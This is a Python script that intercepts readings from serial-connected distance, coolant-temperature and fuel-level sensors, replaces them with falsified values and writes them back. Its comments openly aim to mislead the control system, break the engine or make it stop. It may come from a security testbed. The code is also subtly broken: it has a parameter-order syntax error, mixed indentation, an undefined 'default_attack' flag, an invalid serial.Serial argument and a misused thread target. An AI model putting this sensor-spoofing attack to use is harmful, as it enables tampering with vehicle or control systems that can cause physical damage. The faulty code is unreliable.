import serial
import numpy as np
import threading



def bytes_to_int(bytes):
    result = 0
    for b in bytes:
        result = result * 256 + int(b)

    return result

def int_to_bytes(value):
	result = []
	for i in range(8):
		result.append(value >> (i * 8) & 0xff)

	result.reverse()

	return result

"""
distance sensor --> to sense the distance 
when the distance gets smaller, we change is to a large data, 
which may miss up the control system.
"""
def default_attack_distance(ori_data, thre=100):
	if (ori_data < thre):
		ori_data  = thre * 1.1
	else:
		ori_data = np.random.randn() * ori_data
	return ori_data

"""
temperature sensor --> to sense the water temperature of a car
if the temperature is high, fan should be speed up
but if we change the data to low, the engine may break
"""
def default_attack_temp(ori_data, thre=90):
	if (ori_data > thre):
		ori_data  = thre
	else:
		ori_data = np.random.randn() * ori_data
	return ori_data

"""
water depth --> to sense the oil tank
if the data of oil tank is low, we should add more gas to the car,
but if we change the data to high, the sensor will not sense whether the oil tank is empty,
it may result in engine stop
"""
def default_attack_water(ori_data, thre=20):
	if (ori_data < thre):
		ori_data = thre
	else:
		ori_data = np.random.randn() * ori_data
	return ori_data

def distance_thread(serial_port='/dev/ttyACM0', baud_rate=115200):
	ser = serial.Serial(serial_port, baud_rate, default_attack=True)
	while (1):
	    line = ser.readline()
	    # print(line)
	    ori_data = list(line)

	    if (len(ori_data) == 9 and ori_data[8] == 10):
	    	del ori_data[8]
	    	print("distance thread:")

	    	ori_data_int = bytes_to_int(ori_data)
	    	print("original data: ", ori_data)

	    	if (default_attack):
				att_data = default_attack_distance(ori_data_int)
	    		att_data_bytes = int_to_bytes(att_data)
    		else :
    			pass # for customized attack function

	    	print("attacked data: ", att_data_bytes)

	    	ser.write("i".encode())
	    	ser.write(att_data_bytes)

def temp_thread(serial_port='/dev/ttyACM2', baud_rate):
	ser = serial.Serial(serial_port, baud_rate, default_attack=True)
	while (1):
	    line = ser.readline()
	    # print(line)
	    ori_data = list(line)

	    if (len(ori_data) == 9 and ori_data[8] == 10):
	    	del ori_data[8]
	    	print("temperature thread:")

	    	ori_data_int = bytes_to_int(ori_data)
	    	print("original data: ", ori_data)

	    	if (default_attack):
	    		att_data = default_attack_temp(ori_data_int)
	    		att_data_bytes = int_to_bytes(att_data)
	    	else :
    			pass # for customized attack function

	    	print("attacked data: ", att_data_bytes)

	    	ser.write("i".encode())
	    	ser.write(att_data_bytes)

def water_thread(serial_port='/dev/ttyACM1', baud_rate=115200):
	ser = serial.Serial(serial_port, baud_rate, default_attack=True)
	while (1):
	    line = ser.readline()
	    # print(line)
	    ori_data = list(line)

	    if (len(ori_data) == 9 and ori_data[8] == 10):
	    	del ori_data[8]
	    	print("water depth thread:")

	    	ori_data_int = bytes_to_int(ori_data)
	    	print("original data: ", ori_data)

	    	if (default_attack):
		    	att_data = default_attack_water(ori_data_int)
		    	att_data_bytes = int_to_bytes(att_data)
	    	else :
    			pass # for customized attack function
	    	
	    	print("attacked data: ", att_data_bytes)

	    	ser.write("i".encode())
	    	ser.write(att_data_bytes)


serial_port_distance = '/dev/ttyACM0'
serial_port_temp = '/dev/ttyACM2'
serial_port_water = '/dev/ttyACM1'
baud_rate = 115200


# multi thread to listen the serial data of various sensors
t_distance=threading.Thread(target=distance_thread)
t_temp=threading.Thread(target=temp_thread(serial_port_temp, baud_rate))
t_water=threading.Thread(target=water_thread)
t_distance.start()
t_temp.start()
t_water.start()


